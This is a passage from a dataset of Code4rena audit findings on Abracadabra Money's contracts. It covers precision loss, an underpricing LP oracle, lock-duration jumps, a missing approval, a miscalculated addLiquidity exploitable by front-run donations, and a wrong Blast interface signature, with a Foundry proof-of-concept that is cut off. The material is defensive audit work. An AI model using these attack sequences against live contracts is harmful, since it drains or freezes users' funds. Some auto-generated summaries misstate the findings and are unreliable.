      "title": "[M-07] Permanent loss of yield for stakers in reward pools due to precision loss.",
      "impact": "MEDIUM",
      "content": "\nThe LockingMultiRewards contract facilitates distribution of rewards across the remaining epoch duration. The calculation for reward rate is provided below:\n`reward.rewardRate = amount / _remainingRewardTime;`\n\nThe `rate` is later multiplied by the  duration to get the total rewards for elapsed time, demonstrated below:\n\n    function rewardsForDuration(address rewardToken) external view returns (uint256) {\n        return _rewardData[rewardToken].rewardRate * rewardsDuration;\n    }\n\nAn issue occurs because there is no sufficient wrapping of the amount before dividing by `_remainingRewardTime`. The number is divided and later multiplied by elapsed time, causing a loss of precision of the amount modulo remaining time. For the provided period of `1 week` by the sponsor, the maximum amount lost can be calculated:\n`7 * 24 * 3600 - 1 = 604799`.\nNote that the average case loss is half of the worst case assuming even distribution across time. However since rewards are usually not sent at the low end of remaining time (see the `minRemainingTime` variable, the actual average would be higher).\n\nThe effect of this size of loss depends on the decimals and value of the reward token. For USDC, this would be $0.6. For WBTC,  it would be $423 (at time of writing). The loss is shared between all stakers relative to their stake amount. The loss occurs for every notification, so it is clear losses will be severe.\n\nSponsor remarked in the channel that reward tokens would be real, popular tokens. We believe USDC / WBTC on ARB are extremely popular tokens and therefore remain fully in scope as reward tokens.\n\n### Severity Rationalization\n\nImpact - high\nLikelihood - medium\n\\-> Severity - high\n\n### Impact\n\nPermanent loss of yield for stakers in reward pools due to precision loss.\n\n### Proof of Concept\n\n*   Reward pool offers WBTC rewards\n*   Epoch has just started,\n\n### Recommended Mitigation Steps\n\nStore the `rewardRate` scaled by 1e18, so loss of precision will be lower by magnitude of `1e18`.\n\n**[0xCalibur (Abracadabra) disputed and commented via duplicate #166](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/166):**\n>No factor.\n\n**[Trust (Warden) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/222#issuecomment-2041019693):**\n > Hi,\n> \n> The duplicate has been closed due to loss of \"dust amounts\". However I show in my submission that it is far from dust, I believe any submissions that have identified material loss of funds should be awarded appropriately.\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the LockingMultiRewards contract, which distributes rewards over a specific period of time. The problem arises from a calculation error where the amount is not properly wrapped before being divided, resulting in a loss of precision. This can lead to a significant loss of yield for stakers in reward pools, particularly for popular tokens like USDC and WBTC. The severity of this issue is considered high and it is recommended to store the reward rate in a different format to mitigate the risk. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/222",
      "tags": [],
      "finders": [
        "grearlake",
        "Trust",
        "AgileJune",
        "Bigsam"
      ]
    },
    {
      "id": "32062",
      "title": "[M-06] MagicLpAggregator always returns lower than correct answer, leading to arbitrage loss",
      "impact": "MEDIUM",
      "content": "\nMagicLpAggregator is used to price LP tokens for \"closely-tied\" underlying tokens. It calculates the price below:\n\n    function latestAnswer() public view override returns (int256) {\n        uint256 baseAnswerNomalized = uint256(baseOracle.latestAnswer()) * (10 ** (WAD - baseOracle.decimals()));\n        uint256 quoteAnswerNormalized = uint256(quoteOracle.latestAnswer()) * (10 ** (WAD - quoteOracle.decimals()));\n        uint256 minAnswer = baseAnswerNomalized < quoteAnswerNormalized ? baseAnswerNomalized : quoteAnswerNormalized;\n        (uint256 baseReserve, uint256 quoteReserve) = _getReserves();\n        baseReserve = baseReserve * (10 ** (WAD - baseDecimals));\n        quoteReserve = quoteReserve * (10 ** (WAD - quoteDecimals));\n        return int256(minAnswer * (baseReserve + quoteReserve) / pair.totalSupply());\n    }\n\nThe code takes the minimal answer between the underlying oracles and considers all reserves to be worth that amount:\n`return int256(minAnswer * (baseReserve + quoteReserve) / pair.totalSupply());`\n\nThe issue is that any difference in price between the assets represents an easy arbitrage opportunity. Suppose we have tokens (A,B), where real oracle shows:\n\n*   A = $0.99\n*   B = $1\n\nThe Pool has 1000000 LP tokens and contains:\n\n*   1000000 A\n*   1000000 B\n\nThe LP value would calculate as:\n`0.99 * 2000000 / 1000000 = $1.98`\nThe actual value is:\n`(0.99 * 1000000 + 1 * 1000000) / 1000000 = $1.99`\n\nSuppose a platform trades LPs using the aggregator pricing. An attacker could:\n\n*   Buy 100,000 LP tokens at $198000\n*   Withdraw from the pool the underlying shares\n*   Sell 100,000 A, 100,000 B at $199000\n*   Profit $1000 from the exchange, when the difference is just $0.01 (this is very common fluctuation even with pegged assets).\n\nThe delta comes at the expense of LP holders whose position gets minimized.\n\n### Impact\n\nLoss of value due to arbitrage of any platform using MagicLpAggregator pricing.\n\n### Recommended Mitigation Steps\n\nAlways calculate the value based on the real underlying token value multiplied by amount.\n\nConsider creating two separate oracles for lower-bound and upper-bound results. Then a lending protocol could indeed use the lower-bound for determining collateral value.\n\n**[0xm3rlin (Abracadabra) disputed and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/223#issuecomment-1998696507):**\n > Intended behavior.\n\n**[141345 (Lookout) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/223#issuecomment-1999800615):**\n > Rounding error could accumulate in MagicLpAggregator.\n\n\n***\n\n",
      "summary": "\nThe MagicLpAggregator is a tool used to determine the value of LP tokens for related underlying tokens. However, there is a bug in the code that allows for easy arbitrage opportunities. This means that an attacker can buy LP tokens at a lower price, withdraw the underlying tokens, and sell them for a higher price, resulting in a profit. This causes a loss of value for LP holders. To fix this issue, it is recommended to calculate the value based on the real underlying token value multiplied by the amount. It is also suggested to create two separate oracles for lower and upper bound results to prevent this type of arbitrage. Some users have also reported potential rounding errors in the code. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/223",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "32061",
      "title": "[M-05] A user's tokens could be locked for an extended duration beyond their intention and without their control",
      "impact": "MEDIUM",
      "content": "\n### Description\n\nThe LockingMultiRewards allows anyone to stake MagicLP tokens in return for rewards.\nLP tokens are sent with either functions below:\n\n    function stake(uint256 amount, bool lock_) public whenNotPaused {\n        _stakeFor(msg.sender, amount, lock_);\n    }\n    /// @notice Locks an existing unlocked balance.\n    function lock(uint256 amount) public whenNotPaused {\n        if (amount == 0) {\n            revert ErrZeroAmount();\n        }\n        _updateRewardsForUser(msg.sender);\n        _balances[msg.sender].unlocked -= amount;\n        unlockedSupply -= amount;\n        _createLock(msg.sender, amount);\n    }\n\nThis will lead to `_createLock()`, which calculates the `nextUnlockTime()`:\n\n    function _createLock(address user, uint256 amount) internal {\n        Balances storage bal = _balances[user];\n        uint256 _nextUnlockTime = nextUnlockTime();\n\n```\n\n    function nextUnlockTime() public view returns (uint256) {\n        return nextEpoch() + lockDuration;\n    }\n```\n\nNote that `nextEpoch()` would always return the next 1-week (or reward duration) slot.\n\n    function epoch() public view returns (uint256) {\n        return (block.timestamp / rewardsDuration) * rewardsDuration;\n    }\n    function nextEpoch() public view returns (uint256) {\n        return epoch() + rewardsDuration;\n    }\n\nAn issue arises because the user cannot specify the latest desired unlock time. This opens the path for the tokens to be locked for longer than expected, which may have significant impact for users if they need the funds. Consider the following case, where `x` is week number:\n\n*   It is day 7x + 6 (one day from nextEpoch)\n*   Assumed unlock time is `7x + 7 + lockDuration`\n*   The TX does not execute in next 1 day for any reason (gas price went up, validator does not include TX, etc)\n*   It is now day 7x+7, another epoch starts. Now nextEpoch is `7x + 14`\n*   Executed unlock time is `7x + 14 + lockDuration`\n\nThis means user's funds are locked for an additional 7 days more than expected.\n\nNote that delayed execution of a user's TX has always been considered in scope, certainly for Med severity impacts:\n\\- <https://solodit.xyz/issues/m-13-interactions-with-amms-do-not-use-deadlines-for-operations-code4rena-paraspace-paraspace-contest-git>\n\\- <https://solodit.xyz/issues/m-04-lack-of-deadline-for-uniswap-amm-code4rena-asymmetry-finance-asymmetry-contest-git>\n\\- <https://solodit.xyz/issues/m-03-missing-deadline-param-in-swapexactamountout-allowing-outdated-slippage-and-allow-pending-transaction-to-be-executed-unexpectedly-code4rena-pooltogether-pooltogether-git>\n\nEssentially the locking function lacks a `deadline` parameter similar to swapping functions, and the impact is temporary freeze of funds.\n\n### Impact\n\nA user's tokens could be locked for an extended duration beyond their intention and without their control.\n\n### Recommended Mitigation Steps\n\nConsider adding a `latestUnlockTime` deadline parameter for the locking functions.\n\n**[0xCalibur (Abracadabra) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/225#issuecomment-1999748860):**\n > https://github.com/Abracadabra-money/abracadabra-money-contracts/pull/138\n >\n >Should be low.\n\n**[cccz (Judge) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/225#issuecomment-2026915999):**\n > Here the latest discussion on transaction delays.\n> https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/331#issuecomment-2021292618\n> \n> And I would consider it QA which is due to low likelihood and medium impact (temporary freeze of funds).\n\n**[Trust (Warden) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/225#issuecomment-2031908790):**\n > Hi,\n> \n> I would like to argue that likelihood is medium and impact is high.\n> likelihood - Assuming there will be many stakers on the platform, at any moment there could be a request close to the end of epoch. The closer the request is to the end of an epoch, the more likely it is a TX will not be executed until the next one.\n> Additionally, the users of the stake() function are completely different in understanding/sophistication from the ones in the Unistaker audit. They **cannot** be assumed to understand TX delays, requirement of invalidating one's TX if it is undesirable, etc. \n> Additionally one needs to take into consideration that gas prices are fluctuating, so censorship of a TX is absolutely not required for the FoF to occur. It just needs to be on a local low-point for the duration until the next interval for the impact to be achieved. Again, consider that this is **not** a targetted attack , the issue is a constant probabilistic leak that given enough time _will_ materialize.\n> \n> For impact, temporary FoF is a very serious issue, on the low end of the High impact (imo). Consider for example that a user assumes their tokens will be available at the unlock period in order to pay off a loan, and because of the FoF they will now default. This is just one example of hundred of different very serious scenarios that would occur to a user that assumes funds will be available in the future.\n> \n> Considering all the arguments above, I believe the finding to be between M and H severity, rather than between L and M severity.\n\n**[cccz (Judge) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/225#issuecomment-2037604576):**\n > Agreed, the lock duration is jumping, which may compromise user.\n\n***\n\n",
      "summary": "\nThe LockingMultiRewards function allows people to stake MagicLP tokens and receive rewards. However, there is an issue where users are unable to specify the latest desired unlock time. This means that tokens may be locked for longer than expected, causing significant problems for users who need access to their funds. The report recommends adding a `latestUnlockTime` deadline parameter to the locking functions. The severity of this issue is debated, with some people believing it to be low and others thinking it is medium to high.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/225",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "32060",
      "title": "[M-04] Loss of assumed functionality of the Onboarding contract in a highly-sensitive area",
      "impact": "MEDIUM",
      "content": "\nThe BlastOnboardingBoot contract contains the bootstraping funds. After launch it will start a reward staking pool and allow users to claim tokens into it. This is in the launch sequence:\n\n    staking = new LockingMultiRewards(pool, 30_000, 7 days, 13 weeks, address(this));\n    staking.setOperator(address(this), true);\n    staking.transferOwnership(owner);\n    // Approve staking contract\n    pool.safeApprove(address(staking), totalPoolShares);\n\nNote that the code approves the staking pool towithdraw from the created LP.\nThe code also provisions setting of the staking contract to another one.\n\n    // Just in case we need to change the staking contract after\n    // the automatic bootstrapping process\n    function setStaking(LockingMultiRewards _staking) external onlyOwner {\n        if (ready) {\n            revert ErrCannotChangeOnceReady();\n        }\n        staking = _staking;\n        emit LogStakingChanged(address(_staking));\n    }\n\nThe issue is that this function lacks two actions:\n\n*   Resetting the previous staking pool's approval to zero\n*   More importantly, approving the new staking pool all the bootstrap pool shares\n\nAs a result, owner which assumes changing to a new staking pool is perfectly safe, will in fact cause reverts when users try claiming in the new pool. It is still possible to revert back to the old staking pool, but in fact it will never be possible to migrate to a new pool as no other approve() call exists in the contract.\n\n### Impact\n\nLoss of assumed functionality of the Onboarding contract in a highly-sensitive area.\n\n### Recommended Mitigation Steps\n\n*   Approve the new contract\n*   Revoke approval from the previous contract for good sanitization\n\n**[141345 (Lookout) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/226#issuecomment-1999665020):**\n > Change staking contract, miss approve update and reset.\n\n**[0xCalibur (Abracadabra) acknowledged and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/226#issuecomment-2002459841):**\n > we can also upgrade the bootstrapper if we were to use the function.  I agree with the finding but we just decided to remove the function setStaking.\n\n***\n\n",
      "summary": "\nThe BlastOnboardingBoot contract has a bug that affects its functionality. The contract is supposed to allow users to claim tokens into a reward staking pool, but there are two issues with the code. First, the function to change the staking pool does not reset the previous pool's approval to zero, which can cause reverts when users try to claim in the new pool. Second, there is no approval for the new staking pool, making it impossible to migrate to a new pool. This bug can result in a loss of functionality for the contract. The recommended mitigation steps are to approve the new contract and revoke approval from the previous contract. The team has acknowledged the bug and has decided to remove the function that caused the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/226",
      "tags": [],
      "finders": [
        "Trust",
        "hals",
        "SpicyMeatball"
      ]
    },
    {
      "id": "32059",
      "title": "[M-03] Miscalculation in addLiquidity of Router results in unauthorized spending of tokens",
      "impact": "MEDIUM",
      "content": "\n### Description\n\nUsers are expected to add liquidity through `addLiquidity()` of the Router. It receives base and quote amounts which are adjusted through `_adjustAddLiquidity()`:\n\n    function addLiquidity(\n        address lp,\n        address to,\n        uint256 baseInAmount,\n        uint256 quoteInAmount,\n        uint256 minimumShares,\n        uint256 deadline\n    ) external ensureDeadline(deadline) returns (uint256 baseAdjustedInAmount, uint256 quoteAdjustedInAmount, uint256 shares) {\n        (baseAdjustedInAmount, quoteAdjustedInAmount) = _adjustAddLiquidity(lp, baseInAmount, quoteInAmount);\n        IMagicLP(lp)._BASE_TOKEN_().safeTransferFrom(msg.sender, lp, baseAdjustedInAmount);\n        IMagicLP(lp)._QUOTE_TOKEN_().safeTransferFrom(msg.sender, lp, quoteAdjustedInAmount);\n        shares = _addLiquidity(lp, to, minimumShares);\n    }\n\nThe adjustment function has DODOv2 code which determines the effective base:quote ratio and adjusts the higher of the two input values so that no input is wasted. Additionally Abrakadbra inserted the following logic at the start of the function:\n\n    (uint256 baseReserve, uint256 quoteReserve) = IMagicLP(lp).getReserves();\n    uint256 baseBalance = IMagicLP(lp)._BASE_TOKEN_().balanceOf(address(lp)) + baseInAmount;\n    uint256 quoteBalance = IMagicLP(lp)._QUOTE_TOKEN_().balanceOf(address(lp)) + quoteInAmount;\n    baseInAmount = baseBalance - baseReserve;\n    quoteInAmount = quoteBalance - quoteReserve;\n\nThe intention is that if the current balance of token X is higher than reserve, the input should be reduced so that only the delta needs to be sent. However the logic is miswritten.\nThe balanceOf() and getReserve() calls have been reversed. The correct logic should be:\n`requested amount = reserves + requested amount - balance`\nInstead it is:\n`requested amount = balance + requested amount - reserves`.\nThe higher the current `balanceOf()`, the higher the final requested amount becomes. This is a critical issue because tokens can be donated to the MagicLP by an attacker, making the victim send more tokens than expected. The POC gives an example of such a sequence.\n\nEssentially this makes addLiquidity(amountX, amountY, minShares) become: (amountX2, amountY2, minShares) where\namountX2 > amountX, amountY2 > amountY. By definition this is unauthorized use of the victim's funds.\n\n### Impact\n\nUnauthorized spending of victim's tokens, leading to monetary losses.\n\n### Proof of Concept\n\n1.  MagicLP has (500 USDC, 500 DAI) reserves and balances, 100 shares\n2.  Victim calls addLiquidity for (1000 USDC, 1000 DAI) , min 200 shares\n3.  Attacker frontrans and donates (1000 USDC, 500 DAI) to the LP\n4.  addLiquidity() executes:\n\n*   baseInAmount = 1500 + 1000 - 500 = 2000 USDC\n*   quoteInAmount = 1000 + 1000 - 500 = 1500 DAI\n*   baseIncreaseRatio = 2000 / 500 = 4\n*   quoteIncreaseRatio = 1500 / 500 = 3\n*   quoteAdjustedInAmount = 1500 DAI\n*   baseAdjustedInAmount = 500 &ast; 3 = 1500 USDC\n\nTherefore LP::buyShares() is called with (1500, 1500) for 200 shares instead of (1000, 1000)\n\nUser has now put an extra ($500,$500) of unauthorized funds in the contract. They may or may not be aware of it when the TX is executed. Note that funds put in the LP are obviously in risk of impermanent loss alongside any other economic, systemic and security-related risks.\nThis is a simple example to prove the point but could be tweaked for different tokens (more or less volatile), amounts and ratios.\n\n### Recommended Mitigation Steps\n\nChange the usage of `getReserves()` and `balanceOf()` in the lines below as described:\n\n    (uint256 baseReserve, uint256 quoteReserve) = IMagicLP(lp).getReserves();\n    uint256 baseBalance = IMagicLP(lp)._BASE_TOKEN_().balanceOf(address(lp)) + baseInAmount;\n    uint256 quoteBalance = IMagicLP(lp)._QUOTE_TOKEN_().balanceOf(address(lp)) + quoteInAmount;\n\nA great extra invariant check would be to require in `addLiquidity()` that the results `baseAdjustedInAmount`, `quoteAdjustedInAmount` are smaller than the original input amounts respectively.\n\nNote that the issue also occurs in the preview function:\n\n    function previewAddLiquidity(\n        address lp,\n        uint256 baseInAmount,\n        uint256 quoteInAmount\n    ) external view returns (uint256 baseAdjustedInAmount, uint256 quoteAdjustedInAmount, uint256 shares) {\n        (uint256 baseReserve, uint256 quoteReserve) = IMagicLP(lp).getReserves();\n        uint256 baseBalance = IMagicLP(lp)._BASE_TOKEN_().balanceOf(address(lp)) + baseInAmount;\n        uint256 quoteBalance = IMagicLP(lp)._QUOTE_TOKEN_().balanceOf(address(lp)) + quoteInAmount;\n        baseInAmount = baseBalance - baseReserve;\n        quoteInAmount = quoteBalance - quoteReserve;\n\nIt should also be fixed here. We view it as the same root cause, but of a lesser end impact.\n\n**[0xCalibur (Abracadabra) confirmed and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/231#issuecomment-2000435031):**\n > Fix here:\n> \n> https://github.com/Abracadabra-money/abracadabra-money-contracts/pull/141\n\n**[cccz (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/231#issuecomment-2025687593):**\n> This is more of a griefing attack, and it seems the victim's 200 share would be worth 2000 USDC, 1666 DAI?\n\n**[Trust (Warden) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/231#issuecomment-2032012050):**\n> Unauthorized spending of tokens is breaking of a core invariant (do not use money user did not intend to spend), which by itself achieves High impact. The submission also explains the risks affecting the unapproved funds.\n> \n> Note that sponsor has confirmed the issue at High severity and views it as such.\n\n**[cccz (Judge) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/231#issuecomment-2039343683):**\n > Hey @trust1995, in POC, if I understand correctly, while the victim spends more tokens, the shares the victim receives will be worth more due to the donations of the griefer (3000 -> 3666), and there doesn't seem to be any locks here, so I don't think this as a higher impact than DOS.\n\n**[Trust (Warden) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/231#issuecomment-2039688010):**\n > I can confirm that the user spends more tokens and receives more shares.\n> In my opinion that suffices for H severity as it is not blocking a victim interaction, it is taking unapproved funds (until the user figures out how to redeem them back). Again, touching user's assets without their permission is very severe.\n\n**[cccz (Judge) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/231#issuecomment-2040281914):**\n > In terms of this attack scenario\n> \n> 1. The attacker needs to donate funds\n> 2. the victim spends more funds than expected\n> 3. The victim receives a portion of the attacker's donated funds\n> 4. the user who added the liquidity should know how to get them back\n> 5. victims can get more money back immediately\n> \n> So I don't think this is high severity.\n\n***\n\n",
      "summary": "\nThis report describes a bug in the `addLiquidity()` function of the MagicLP contract, where the logic for adjusting input amounts is incorrect. This can result in unauthorized spending of a user's tokens, leading to potential monetary losses. The report also includes a proof of concept and recommended mitigation steps. The severity of the bug was initially classified as High, but was later reduced to Medium due to the possibility of the victim receiving more shares in return for their tokens. However, the Warden (the person responsible for reviewing the report) argued that the unauthorized spending of tokens is still a severe issue and should be classified as High. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/231",
      "tags": [],
      "finders": [
        "Trust",
        "ether\\_sky"
      ]
    },
    {
      "id": "32058",
      "title": "[M-02] Tokens yeild can not be set to claimable.",
      "impact": "MEDIUM",
      "content": "\nThe enabling of yeild on rebasing tokens can be permanently DOS-ed.\n\n### Proof of Concept\n\nAbracadabra uses this signature for the configure function for the rebasing function of WETH and USDB\n\n```solidity\nfunction configure(YieldMode) external returns (YieldMode);\n```\n\nBut the actual signature for this is:\n\n```solidity\nfunction configure(YieldMode yieldMode) external returns (uint256)\n```\n\nAnd it returns the balance of caller\n\n<https://github.com/blast-io/blast/blob/c39cdf1fa7ef9e0d4eaf64a7a5cf7b3c46c739fd/blast-optimism/packages/contracts-bedrock/src/L2/ERC20Rebasing.sol#L220C2-L226>\n\nSo if the balance of contract is above 2, this function becomes unusable and can't configure the yeild to be claimable.\n\nThe following function always fails:\n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/blast/libraries/BlastYields.sol#L20-L27>\n\nThis can be exploited by attacker by donating a very little amount of eth to the magicLP, blastOnBoarding and now the blastOnBoarding can't make yeild claimable when the following function is invoked.\n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/blast/BlastOnboarding.sol#L175C14-L183>\n\n### Recommended Mitigation Steps\n\nUse the correct signature used in blast codebase.\n\n**[0xCalibur (Abracadabra) confirmed and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/236#issuecomment-1997742323):**\n > This is a valid report. We already fixed it before the audit ended.\n> \n> The fix is here in IBlast.sol:\n> \n> https://github.com/Abracadabra-money/abracadabra-money-contracts/commit/12f07da03c0adaff123d7e6c684b757855521d61#diff-8f7d8246c1e6d7928012209792b0b3f0a9684a94a40bd802e2b22e5032db04bc\n> \n> Also fixed in the BlastMock.sol file.\n\n**[cccz (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/236#issuecomment-2025611151):**\n > Downgrade to M because the problematic function will be called when deployed. An attacker can just exploit it to prevent the contract from being deployed.\n> And if the attacker wants to exploit it after the contract is deployed, since the mode is fixed to YieldMode.CLAIMABLE, it will just return even if it is called again by the Owner.\n>\n> ```solidity\n>     function enableTokenClaimable(address token) internal {\n>         if (IERC20Rebasing(token).getConfiguration(address(this)) == YieldMode.CLAIMABLE) {\n>             return;\n>         }\n> ```\n>\n > This is the deployment script for blastOnboarding.sol, which shows that setTokenSupported will be called immediately after deployment.\n>\n> ```solidity\n> contract BlastOnboardingScript is BaseScript {\n>     function deploy() public returns (BlastOnboarding onboarding) {\n>         address owner = toolkit.getAddress(block.chainid, \"safe.ops\");\n>         address feeTo = toolkit.getAddress(block.chainid, \"safe.ops\");\n>         address blastGovernor = toolkit.getAddress(block.chainid, \"blastGovernor\");\n>         address blastTokenRegistry = toolkit.getAddress(block.chainid, \"blastTokenRegistry\");\n> \n>         vm.startBroadcast();\n> \n>         onboarding = BlastOnboarding(\n>             payable(deploy(\"Onboarding\", \"BlastOnboarding.sol:BlastOnboarding\", abi.encode(blastTokenRegistry, feeTo, tx.origin)))\n>         );\n> \n>         if (!testing()) {\n>             address usdb = toolkit.getAddress(block.chainid, \"usdb\");\n>             address mim = toolkit.getAddress(block.chainid, \"mim\");\n>             if (!onboarding.supportedTokens(usdb)) {\n>                 onboarding.setTokenSupported(usdb, true);\n>             }\n>             if (!onboarding.supportedTokens(mim)) {\n>                 onboarding.setTokenSupported(mim, true);\n>             }\n>             if (onboarding.owner() != owner) {\n>                 onboarding.transferOwnership(owner);\n>             }\n>         }\n> \n>         vm.stopBroadcast();\n>     }\n> }\n> ```\n>\n> Also, even without the deployment script, I think this is a DOS of M severity and there is no loss of funds because the user cannot deposit tokens until setTokenSupported is called.\n\n_Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/236)._\n\n***\n\n",
      "summary": "\nThis bug report discusses a potential issue with the configuration function for the rebasing function of WETH and USDB in the Abracadabra protocol. The actual signature for this function is different than what is used in the code, which can lead to the function becoming unusable if the contract balance is above 2. This can be exploited by an attacker by donating a small amount of ETH to specific addresses, preventing the function from being able to configure the yield to be claimable. The recommended mitigation steps include using the correct signature in the codebase. The severity of this issue has been decreased to Medium, as it can only be exploited before the contract is deployed and there is no loss of funds. For more details and discussion, please refer to the full report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/236",
      "tags": [],
      "finders": [
        "hassanshakeel13"
      ]
    },
    {
      "id": "32057",
      "title": "[M-01] Pool Creation Failure Due to WETH Transfer Compatibility Issue on Some Chains",
      "impact": "MEDIUM",
      "content": "\nIn the `Router.sol` file of the `mimswap`, there's a method to create a pool for native tokens by wrapping them to their \"wrapped\" counterpart before sending them to the newly created pool.\n\n```solidity\nsrc/mimswap/periphery/Router.sol:\n  73:     function createPoolETH(\n  74:         address token,\n  75:         bool useTokenAsQuote,\n  76:         uint256 lpFeeRate,\n  77:         uint256 i,\n  78:         uint256 k,\n  79:         address to,\n  80:         uint256 tokenInAmount\n  81:     ) external payable returns (address clone, uint256 shares) {\n  82:         if (useTokenAsQuote) {\n  83:             _validateDecimals(18, IERC20Metadata(token).decimals());\n  84:         } else {\n  85:             _validateDecimals(IERC20Metadata(token).decimals(), 18);\n  86:         }\n  87: \n  88:         clone = IFactory(factory).create(useTokenAsQuote ? address(weth) : token, useTokenAsQuote ? token : address(weth), lpFeeRate, i, k);\n  89: \n  90:         weth.deposit{value: msg.value}();\n  91:         token.safeTransferFrom(msg.sender, clone, tokenInAmount);\n  92:         address(weth).safeTransferFrom(address(this), clone, msg.value);\n  93:         (shares, , ) = IMagicLP(clone).buyShares(to);\n  94:     }\n```\n\nHowever, the transfer done using `address(weth).safeTransferFrom` (see line 92). This works fine on most chains (Ethereum, Optimism, Polygon, BSC) which uses the standard `WETH9` contract that handles the case  when `src == msg.sender`:\n\n```solidity\nWETH9.sol\n        if (src != msg.sender && allowance[src][msg.sender] != uint(- 1)) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n```\n\nThe problem is that the `WETH` implementation on `Blast` uses [a different contract](https://blastscan.io/address/0x4300000000000000000000000000000000000004#code), and does not have this `src == msg.sender` handling.\n\nAlso, the issue is presented in [Wrapped Arbitrum](https://arbiscan.io/address/0x8b194beae1d3e0788a1a35173978001acdfba668#code) and  [Wrapped Fantom](https://ftmscan.com/token/0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83#code).\n\n### Impact\n\nThe failure to approve the `Router` contract to spend `WETH` tokens will prevent the protocol from creating native tokens pools on multiple chains like Blast.\n\n### Proof of Concept\n\nRun test using this command:\n\n```bash\nforge test --match-test testPoC_TransferFromRevert --fork-url https://rpc.blast.io\n```\n\n```solidity\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\nimport {IERC20} from \"forge-std/interfaces/IERC20.sol\";\n\ncontract PairTest is Test {\n    address alice = address(0xf683Ce59521AA464066783d78e40CD9412f33D21);\n    address bob = address(0x2);\n    // WETH address on Blast network\n    IERC20 public constant WETH = IERC20(0x4300000000000000000000000000000000000004);\n    error InsufficientAllowance();\n\n    function testPoC_TransferFromRevert() public {\n        // stdstore write for packed slot is complex so we use a real address that has tokens in blaset main net weth\n        // if this fails we need to update alice address to an address that has more than 1 ether balance in weth blast main net\n        assert(WETH.balanceOf(alice) > 1 ether);\n\n        vm.startPrank(alice);\n        vm.expectRevert(InsufficientAllowance.selector);\n        WETH.transferFrom(alice, bob, 1 ether);\n        vm.stopPrank();\n    }\n}\n```\n\n### Test output\n\n```bash\n2024-03-abracadabra-money main* 5s\n❯ forge test --match-test testPoC_TransferFromRevert --fork-url https://rpc.blast.io -vvvv\n[⠊] Compiling...\n[⠑] Compiling 1 files with 0.8.20\n[⠘] Solc 0.8.20 finished in 598.78ms\nCompiler run successful!\n\nRan 1 test for test/weth.t.sol:PairTest\n[PASS] testPoC_TransferFromRevert() (gas: 25796)\nTraces:\n  [25796] PairTest::testPoC_TransferFromRevert()\n    ├─ [9930] 0x4300000000000000000000000000000000000004::balanceOf(0xf683Ce59521AA464066783d78e40CD9412f33D21) [staticcall]\n    │   ├─ [4910] 0x83acB050AA232F97810F32aFACDE003303465ca5::balanceOf(0xf683Ce59521AA464066783d78e40CD9412f33D21) [delegatecall]\n    │   │   └─ ← 3234865746423262842620 [3.234e21]\n    │   └─ ← 3234865746423262842620 [3.234e21]\n    ├─ [0] VM::startPrank(0xf683Ce59521AA464066783d78e40CD9412f33D21)\n    │   └─ ← ()\n    ├─ [0] VM::expectRevert(InsufficientAllowance())\n    │   └─ ← ()\n    ├─ [3470] 